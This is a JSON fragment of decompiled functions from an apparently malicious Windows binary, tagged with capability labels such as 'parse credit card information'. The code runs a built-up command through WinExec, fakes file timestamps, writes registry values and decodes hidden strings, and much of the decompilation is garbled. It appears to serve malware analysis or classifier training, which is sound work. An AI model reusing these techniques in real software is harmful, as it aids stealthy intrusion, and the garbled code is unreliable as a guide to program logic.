code_r0x00401ae4;\n        }\n        pcVar4 = NULL;\n    }\n    else {\n        pcVar1 = unaff_EDI + 1;\n        cVar3 = in(in_DX);\n        *unaff_EDI = cVar3;\n        var_4h = in_ECX;\n        if (0x5a4d < uVar2) {\ncode_r0x00401ae4:\n            if (*(arg_8h + 0x1e) < 0x81) {\n                return NULL;\n            }\n            piVar10 = *(arg_8h + 0x1e) - 0x80;\n            if (0xbf < *(arg_8h + 0x1e)) {\n                piVar10 = var_4h;\n            }\n            puVar5 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n            if (puVar5 == NULL) {\n                return NULL;\n            }\n            piVar8 = NULL;\n            if (piVar10 != NULL) {\n                do {\n                    iVar6 = (*_sym.imp.MSVCRT.dll_rand)();\n                    piVar9 = piVar8 + 1;\n                    *(piVar8 + puVar5) = iVar6 % 0xff;\n                    piVar8 = piVar9;\n                } while (piVar9 < piVar10);\n            }\n            puVar11 = arg_8h + 0x40;\n            for (uVar7 = piVar10 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n                *puVar11 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar11 = puVar11 + 1;\n            }\n            for (uVar7 = piVar10 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n                *puVar11 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar11 = puVar11 + 1;\n            }\n            sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n            return 0x1;\n        }\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(*in_ECX, 0xbc);\n        pcVar4 = 0x33c488b;\n        unaff_00023900 = '\\f';\n        unaff_00023b00 = &stack0xffffffe4;\n        puVar11 = &stack0xffffffe4;\n        cVar3 = '\\v';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar11 = puVar11 + -1;\n            *puVar11 = *puVar5;\n            cVar3 = cVar3 + -1;\n            unaff_EDI = pcVar1;\n        } while ('\\0' < cVar3);\n    }\n    iVar6 = (unaff_00023900 - 1) * -4;\n    *(&stack0xfffffff4 + iVar6) = unaff_00023b00;\n    cVar3 = pcVar4;\n    *pcVar4 = *pcVar4 + cVar3;\n    *unaff_EDI = *unaff_EDI + in_ECX;\n    *unaff_ESI = *(&stack0xffff71e5 + iVar6);\n    *pcVar4 = *pcVar4 + cVar3;\n    *(unaff_EBX + 0x30) = *(unaff_EBX + 0x30) + cVar3;\n    *(unaff_ESI + -0x26) = in_DX;\n    pcVar1 = in_ECX * 2 + 0x33;\n    *pcVar1 = *pcVar1 + (in_DX >> 8);\n    unaff_EDI[0x5e] = unaff_EDI[0x5e];\n    return pcVar4;\n}\n",
        "token_count": 1425
    },
    "00402100": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004021df) overlaps instruction at (ram,0x004021de)\n// \n// WARNING: Removing unreachable block (ram,0x004021cf)\n\nuint __cdecl fcn.00402100(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint *puVar8;\n    char lpBuffer;\n    uint var_22fh;\n    uint var_12ch;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t hFile;\n    \n    lpBuffer = '\\0';\n    var_12ch._0_1_ = 0;\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &var_12ch + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    hFile = arg_ch;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar6 = &lpBuffer;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    uVar3 = 0xffffffff;\n    *(arg_ch + -0x3fcc0037) = *(arg_ch + -0x3fcc0037) + -0x41;\n    pcVar6 = 0x411164;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != -0x41);\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    puVar5 = &var_12ch;\n    do {\n        puVar8 = puVar5;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        puVar8 = puVar5 + 1;\n        cVar1 = *puVar5;\n        puVar5 = puVar8;\n    } while (cVar1 != -0x41);\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = puVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(*0x10 + -0x130, 0, 0xd4);\n    if ((arg_ch == -1) && (hFile = fcn.00402cf0(arg_8h),  hFile == -1)) {\n        return 0;\n    }\n    iVar2 = hFile;\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(hFile, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1241
    },
    "004026a0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.004026a0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x4225cc == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00401d80(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x411400, acStack1304, &uStack2112);\n    uStack2088 = 0x411488;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4114a0;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004014f0(auStack1564, 0x4113fc, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1868
    },
    "00403e00": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489",
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403eac) overlaps instruction at (ram,0x00403eab)\n// \n\nbool fcn.00403e00(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uchar *extraout_ECX;\n    uchar *puVar3;\n    uint8_t *unaff_EBX;\n    char *unaff_ESI;\n    uint *puVar4;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    puVar4 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    pcbData = 0x104;\n    *(puVar4 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x41157c, 0x4115a4, &pdwType, &pvData, &pcbData);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    if ((puVar1 < 0) || (puVar1 >= 0)) {\n        puVar3 = &pvData;\n        *puVar1 = 0;\n    }\n    else {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        *unaff_ESI = *unaff_ESI + unaff_ESI;\n        puVar3 = extraout_ECX;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(puVar3);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 465
    },
    "00402bd0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402c20) overlaps instruction at (ram,0x00402c1d)\n// \n// WARNING: Removing unreachable block (ram,0x00402c14)\n\nbool fcn.00402bd0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00402ef0(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4112f4, 0x411334, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 295
    },
    "00402d40": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402df3) overlaps instruction at (ram,0x00402df2)\n// \n\nuint32_t __fastcall fcn.00402d40(uint param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    uint32_t unaff_EBX;\n    uchar *puVar8;\n    uint *puVar9;\n    uint *puVar10;\n    uint *puVar11;\n    bool bVar12;\n    uint32_t in_stack_00000010;\n    uint8_t auStack12 [6];\n    char acStack6 [2];\n    \n    puVar8 = &stack0xfffffffc;\n    uVar6 = in_stack_00000010 * 2;\n    puVar11 = NULL;\n    if (0 < in_stack_00000010) {\n        puVar9 = 0x1;\n        do {\n            bVar12 = SBORROW1(param_2, 'Q');\n            uVar3 = uVar6 & 0xffffff00 | *(puVar11 + *(puVar8 + 0x10));\n            if ((bVar12) || (uVar3 = uVar6 & 0xffff00 | *(puVar11 + *(puVar8 + 0x10)) | uVar6 & 0xff000000,  !bVar12)) {\n                unaff_EBX = *(puVar8 + 8);\n                cVar2 = *(puVar9 % *(puVar8 + 0xc) + unaff_EBX);\n                puVar10 = puVar9;\n            }\n            else {\n                *puVar11 = *puVar9;\n                *(uVar3 + 0x8a0c7df7) = *(uVar3 + 0x8a0c7df7) | unaff_EBX;\n                cVar2 = in_stack_00000010 + '\\x1b';\n                puVar10 = puVar9 + 1;\n                puVar11 = puVar11 + 1;\n            }\n            puVar8[-2] = cVar2;\n            iVar4 = *(puVar8 + 0xc);\n            param_2 = (puVar10 + -1) % iVar4;\n            uVar5 = uVar3 ^ *(param_2 + unaff_EBX);\n            puVar8[-1] = uVar5;\n            bVar12 = (uVar3 & 0xffffff00) >> 8 == unaff_EBX;\n            uVar6 = uVar3 & 0xffff0000 | uVar3 & 0xffffff00 | uVar5;\n            if ((bVar12) || (!bVar12)) {\n                uVar5 = puVar8[-8];\n                uVar3 = uVar5;\n                uVar7 = uVar5 ^ puVar8[-1];\n                param_2 = uVar7;\n                uVar6 = *(puVar8 + 0x18);\n                *((uVar6 - 1) + puVar10) = uVar7;\n                if (uVar7 != 0) goto code_r0x00402e06;\n            }\n            else {\n                uVar1 = in(param_2);\n                *puVar11 = uVar1;\n                if (&stack0xffffffec < 1) {\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(*(puVar8 + 8), *(puVar8 + 0xc), 0, 0x3f, puVar8 + -4)\n                    ;\n                    if (iVar4 == 0) {\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)\n                                          (*(puVar8 + -4), *(puVar8 + 0x10), 0, *(puVar8 + 0x14), *(puVar8 + 0x18), \n                                           *(puVar8 + 0x1c));\n                        if (iVar4 != 0) {\n                            unaff_EBX = 0;\n                        }\n                        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*(puVar8 + -4));\n                        return unaff_EBX;\n                    }\n                    return 0;\n                }\n                uVar3 = (puVar10 + -1) / iVar4 ^ 0xdee0ed6d;\n                uVar3 = uVar3 & 0xffff0000 | uVar3 + (uVar3 >> 8) * -0x31;\n                *(param_2 + 0x4d8af845) = *(param_2 + 0x4d8af845) ^ uVar5;\n                *(param_2 + 0x8bd132d0) = *(param_2 + 0x8bd132d0) + -1;\n                puVar8 = puVar8 + -1;\n                *(uVar3 + 0x74ff3154) = *(uVar3 + 0x74ff3154) - uVar5;\n                puVar11 = puVar11 + 1;\ncode_r0x00402e06:\n                uVar5 = uVar3;\n            }\n            unaff_EBX = unaff_EBX & 0xffffff00 | puVar8[-2];\n            puVar9 = puVar10 + 2;\n            puVar11 = puVar11 + 1;\n            *(puVar10 + uVar6) = uVar5 ^ puVar8[-2];\n            in_stack_00000010 = *(puVar8 + 0x14);\n        } while (puVar11 < in_stack_00000010);\n    }\n    return in_stack_00000010;\n}\n",
        "token_count": 1274
    },
    "00402fe0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004031e4) overlaps instruction at (ram,0x004031e3)\n// \n\nvoid fcn.00402fe0(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    char cVar3;\n    int16_t iVar4;\n    uchar *puVar5;\n    uint32_t *puVar6;\n    uint8_t *puVar7;\n    uint16_t uVar8;\n    uint32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    uint32_t *extraout_ECX_02;\n    uint32_t *extraout_ECX_03;\n    uint32_t *extraout_ECX_04;\n    uint8_t uVar11;\n    int32_t extraout_ECX_05;\n    char *pcVar9;\n    char *extraout_ECX_06;\n    int32_t extraout_ECX_07;\n    int32_t iVar10;\n    uint8_t extraout_DL;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    ushort extraout_DX_01;\n    uint32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t iVar12;\n    int32_t extraout_EDX_02;\n    char *unaff_EBX;\n    uint unaff_EBP;\n    uchar *unaff_ESI;\n    uchar *unaff_EDI;\n    uchar *puVar13;\n    uint *puVar14;\n    uint16_t in_SS;\n    int32_t in_FS_OFFSET;\n    bool bVar15;\n    uchar uVar16;\n    uchar uVar17;\n    bool bVar18;\n    uchar uVar19;\n    bool in_SF;\n    char cVar20;\n    bool bVar21;\n    char cVar22;\n    uchar uVar23;\n    float10 in_ST0;\n    ulong uVar24;\n    uint32_t in_stack_ffffffb0;\n    uint in_stack_ffffffc0;\n    uint arg_14h;\n    uint uVar25;\n    uint uVar26;\n    int32_t arg_14h_00;\n    uint in_stack_ffffffe0;\n    uint uVar27;\n    uint32_t uVar28;\n    int32_t *piVar29;\n    uint uVar30;\n    ushort uVar31;\n    ushort uVar32;\n    ushort uVar33;\n    ushort uVar34;\n    \n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n        unaff_EDI = unaff_EDI + 5;\n        unaff_ESI = unaff_ESI + 5;\n    }\n    fcn.00402b40(0x407010, 0x15, 0x411140, 10);\n    cVar3 = fcn.00402b40(0x407010, 0x15, 0x41114c, 0x12);\n    uVar8 = (extraout_ECX ^ 0x6dd) + 1;\n    cVar20 = '\\0';\n    cVar3 = ((extraout_ECX & 0xffff0000 | uVar8 & 0xff | (uVar8 >> 8) + cVar3 << 8) ^ extraout_EDX) < 0;\n    uVar28 = 0x40305e;\n    puVar5 = fcn.00402b40(0x407010, 0x15, 0x411160, 4);\n    if ((cVar20 == cVar3) && (uVar28 = uVar28 & 0xffff | extraout_ECX_00 << 0x10,  cVar20 != cVar3)) {\n        *(in_FS_OFFSET + extraout_ECX_00) = *(in_FS_OFFSET + extraout_ECX_00) + (unaff_ESI | 0x68);\n        unaff_ESI = puVar5;\n    }\n    else {\n        uVar28 = 0xc;\n        in_stack_ffffffe0 = 0x411164;\n    }\n    fcn.00402b40(0x407010, 0x15, in_stack_ffffffe0, uVar28);\n    fcn.00402b40(0x407010, 0x15, 0x411170, 7);\n    fcn.00402b40(0x407010, 0x15, 0x411178, 0xb);\n    uVar28 = fcn.00402b40(0x407010, 0x15, 0x411184, 0xc);\n    uVar16 = (unaff_EDI & uVar28) == 0;\n    bVar15 = (POPCOUNT(unaff_EDI & uVar28 & 0xff) & 1U) == 0;\n    iVar4 = fcn.00402b40(0x407010, 0x15, 0x411190, 8);\n    if ((bVar15) || (!bVar15)) {\n        piVar29 = 0xd;\n        unaff_EBP = 0x411198;\n    }\n    else {\n        puVar6 = extraout_EDX_00 + 0xd;\n        uVar28 = *puVar6;\n        *puVar6 = *puVar6 - 0x68;\n        *extraout_ECX_01 = *extraout_ECX_01 + iVar4 + (uVar28 < 0x68);\n        uVar16 = *extraout_ECX_01 == 0;\n        piVar29 = extraout_ECX_01;\n    }\n    fcn.00402b40(0x407010, 0x15, unaff_EBP, piVar29);\n    puVar5 = unaff_ESI;\n    if ((!uVar16) && (uVar16)) {\n        puVar5 = unaff_ESI + 1;\n        out(*unaff_ESI, extraout_DX);\n    }\n    uVar26 = 0x15;\n    uVar25 = 0x403174;\n    fcn.00402b40(0x407010, 0x15, 0x4111a8, 0x18);\n    fcn.00402b40(0x407010, 0x15, 0x4111c0, 0x25);\n    uVar16 = extraout_DL < 0x51;\n    bVar15 = SBORROW1(extraout_DL, 'Q');\n    uVar17 = extraout_DL == 0x51;\n    uVar33 = 0x11e8;\n    uVar34 = 0x41;\n    uVar31 = 0x15;\n    uVar32 = 0;\n    uVar30 = 0x407010;\n    uVar28 = 0x4031db;\n    fcn.00402b40(0x407010, 0x15, 0x4111e8, 10);\n    if (bVar15) goto code_r0x004031ff;\n    uVar28 = uVar28 & 0xffff | extraout_EDX_01 << 0x10;\n    puVar6 = extraout_ECX_02;\n    iVar12 = extraout_EDX_01;\n    pcVar9 = unaff_EBX;\n    puVar13 = unaff_EDI;\n    while (unaff_EBX = pcVar9,  unaff_EDI = puVar13,  !bVar15) {\ncode_r0x004031ff:\n        uVar28 = 0xc;\n        uVar27 = 0x4111f4;\ncode_r0x00403206:\n        puVar6 = fcn.00402b40(0x407010, 0x15, uVar27, uVar28);\n        if ((uVar16) || (!uVar16)) {\n            uVar26 = 0x15;\n            uVar25 = 0x40324a;\n            fcn.00402b40(0x407010, 0x15, 0x411200, 0xd);\n            uVar33 = 0x1210;\n            uVar34 = 0x41;\n            uVar31 = 0x15;\n            uVar32 = 0;\n            uVar30 = 0x407010;\n            fcn.00402b40(0x407010, 0x15, 0x411210, 6);\n            puVar6 = extraout_ECX_04;\n            iVar12 = extraout_EDX_02;\n            goto code_r0x0040326a;\n        }\n        uVar16 = &stack0xffffffd8 < *puVar6;\n        bVar15 = SCARRY4(puVar6, 1);\n        uVar17 = puVar6 == 0xffffffff;\n        if (uVar16 || uVar17) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        iVar12 = 0x5a667a78;\n        puVar6 = extraout_ECX_03;\n        pcVar9 = unaff_EBX;\n        puVar13 = unaff_EDI;\n    }\n    unaff_EDI = puVar13 + 1;\n    uVar19 = in(iVar12);\n    *puVar13 = uVar19;\n    unaff_EBX = CONCAT31(pcVar9 >> 8, 0xbc);\n    if (uVar16 || uVar17) {\n        uVar27 = 0x56;\n        unaff_EBX = pcVar9 & 0xffff0000 | CONCAT11(*puVar6, 0xbc);\n        uVar1 = uVar16;\n        uVar16 = 0xb97f395 < *puVar6 || CARRY4(*puVar6 + 0xf4680c6a, uVar1);\n        *puVar6 = *puVar6 + 0xf4680c6a + uVar1;\n        goto code_r0x00403206;\n    }\ncode_r0x0040326a:\n    uVar11 = (puVar6 >> 8) - *unaff_EBX;\n    *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xffffffe8;\n    puVar7 = iVar12 + 0x15;\n    bVar15 = CARRY1(*puVar7, uVar11);\n    bVar21 = SCARRY1(*puVar7, uVar11);\n    *puVar7 = *puVar7 + uVar11;\n    bVar18 = *puVar7 == 0;\n    fcn.00402b40(0x407010, uVar30, CONCAT22(uVar32, uVar31), CONCAT22(uVar34, uVar33));\n    if ((bVar21) || (!bVar21)) {\n        uVar30 = 0xd;\n    }\n    else {\n        puVar14 = unaff_EDI + 1;\n        uVar16 = in(extraout_DX_00);\n        *unaff_EDI = uVar16;\n        if (!bVar15 && !bVar18) {\n            uVar30 = 0x67;\n            goto code_r0x004032f5;\n        }\n        uVar30 = 0x56;\n    }\n    fcn.00402b40(0x4032c4, 0x15, in_stack_ffffffc0, uVar25);\n    puVar14 = in_stack_ffffffb0 & 0xffff0000 | in_SS;\n    fcn.00402b40(0x407010, 0x15, 0x411230, 0x47);\n    if ((*0x10 == 0x20 || SCARRY4(&stack0xffffffa4, 0x40) != &stack0xffffffe0 < 0) ||\n       (*0x10 != 0x20 && SCARRY4(&stack0xffffffa4, 0x40) == &stack0xffffffe0 < 0)) {\n        uVar30 = 0xf;\n    }\ncode_r0x004032f5:\n    fcn.00402b40(0x407010, 0x15, 0x41124c, uVar30);\n    uVar28 = puVar5 & 0xffff0000 | puVar5 + 1;\n    uVar16 = uVar28 < 0x222c;\n    cVar22 = SBORROW4(uVar28, 0x222c);\n    cVar20 = uVar28 - 0x222c < 0;\n    cVar3 = uVar28 == 0x222c;\n    do {\n        uVar30 = 0x41125c;\n        uVar27 = 0x407010;\n        uVar25 = 0x403340;\n        fcn.00402b40(0x407010, 0x15, 0x41125c, 0x407010);\n        if ((uVar16) || (!uVar16)) {\n            uVar25 = 0xb;\n            uVar26 = 0x41126c;\n            goto code_r0x00403360;\n        }\n        pcVar9 = extraout_ECX_05 + -1;\n    } while (pcVar9 != NULL && cVar3 != '\\0');\n    *puVar14 = puVar5 + 4;\n    puVar5 = 0x6ab8ec44;\n    cVar3 = *0x9750e2b5 + *pcVar9;\n    cVar22 = SCARRY1(*0x9750e2b5, *pcVar9) != SCARRY1(cVar3, '\\0');\n    cVar20 = cVar3 < '\\0';\n    cVar3 = cVar3 == '\\0';\ncode_r0x00403360:\n    arg_14h = 0x40336c;\n    fcn.00402b40(0x407010, 0x15, uVar26, uVar25);\n    if ((cVar3 || cVar22 != cVar20) || (!cVar3 && cVar22 == cVar20)) {\n        arg_14h = 0xb;\n    }\n    fcn.00402b40(0x407010, 0x15, 0x411278, arg_14h);\n    if ((!cVar3) && (cVar3)) {\n        out(*puVar5, extraout_DX_01);\n    }\n    uVar25 = 0x411284;\n    cVar3 = fcn.00402b40(0x407010, 0x15, 0x411284, 0xb);\n    cVar22 = SCARRY4(&stack0xffffffa4, 0x40);\n    cVar20 = &stack0xffffffe4 < 0;\n    uVar16 = *0x10 == 0x1c;\n    if ((0xffffffbf < &stack0xffffffa4) || (0xffffffbf >= &stack0xffffffa4)) {\n        uVar27 = 10;\n        uVar30 = 0x411290;\n    }\n    else {\n        puVar14 = puVar14 ^ *(puVar14 + 